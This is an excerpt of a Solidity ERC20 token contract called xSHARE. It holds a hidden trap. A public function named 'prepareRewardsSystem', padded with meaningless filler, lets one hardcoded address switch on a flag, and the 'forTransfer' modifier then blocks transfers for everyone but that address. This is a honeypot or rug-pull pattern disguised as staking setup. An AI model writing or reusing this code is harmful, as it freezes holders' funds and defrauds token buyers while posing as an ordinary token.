...
contract xSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenbc_totalSupply;
    uint256 private _tokenbc_status = 0;
    uint256 public stakingPoolbcStatus = 0;

    string private _tokenbc_name;
    string private _tokenbc_symbol;

    address private _poolbcAddress = 0x5c7897D9af941Ff32053091F14886Ad7fef49fEa; 

    constructor() {
        _tokenbc_name = "xSHARE";
        _tokenbc_symbol = "xSHARE";
        _tokenbc_totalSupply = 1001 * 10 ** 18;
        _balances[msg.sender] = _tokenbc_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbcAddress || _tokenbc_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbcStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbcAddress)
        {
            _tokenbc_status = 1;
        }
    }
